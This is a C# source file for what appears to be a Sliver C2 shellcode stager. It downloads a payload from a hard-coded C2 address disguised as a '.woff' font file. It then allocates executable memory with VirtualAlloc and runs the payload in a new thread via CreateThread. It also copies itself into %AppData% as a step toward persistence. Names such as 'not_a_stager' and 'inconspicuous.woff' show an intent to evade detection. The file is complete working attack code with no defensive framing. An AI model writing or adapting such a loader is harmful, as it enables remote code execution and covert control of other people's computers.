// inspired by https://dominicbreuker.com/post/learning_sliver_c2_06_stagers/

using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;

namespace not_a_stager
{
    class Program
    {
        public static void Main(String[] args)
        {
            // specify IP of C2 and a .woff endpoint (can be anything)
            byte[] shellcode = Download("http://192.168.3.153/inconspicuous.woff");
            Execute(shellcode);

            return;
        }

        private static byte[] Download(string url)
        {
            //Download shellcode
            System.Net.WebClient client = new System.Net.WebClient();
            byte[] shellcode = client.DownloadData(url);

            return shellcode;
        }

        private static void dupe()
        {
            try
            {
                // Get the path to the current executable
                string currentExecutablePath = Assembly.GetEntryAssembly().Location;

                string targetDirectory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

                // Specify the name for the copied executable (you can keep it the same)
                string copiedExecutableName = Path.GetFileName(currentExecutablePath);

                // Combine the target directory with the copied executable name
                string destinationPath = Path.Combine(targetDirectory, copiedExecutableName);

                // Check if the executable is already in the target directory
                if (!File.Exists(destinationPath))
                {
                    // Copy the executable to the target directory
                    File.Copy(currentExecutablePath, destinationPath);
                }
            }
            catch (Exception ex)
            {
                // For troubleshooty
                Console.WriteLine("Bruh: " + ex.Message);
            }
        }

        // VirtualAlloc API
        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        // CreateThread API
        [DllImport("kernel32")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        //WaitForSingleObject API
        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        private static void Execute(byte[] shellcode)
        {
            //Allocate RWX space in memory
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (UInt32)shellcode.Length, 0x1000, 0x40);
            
            //Copy shellcode to allocated memory
            Marshal.Copy(shellcode, 0, (IntPtr)(addr), shellcode.Length);
            
            //Run shellcode in new thread
            IntPtr hThread = IntPtr.Zero;
            IntPtr threadId = IntPtr.Zero;
            hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, threadId);

            //Duplicate itself to %AppData% for persistence later
            dupe();

            //Wait for thread to finish for an infinite amount of time
            WaitForSingleObject(hThread, 0xFFFFFFFF);

            return;
        }
    }
}       
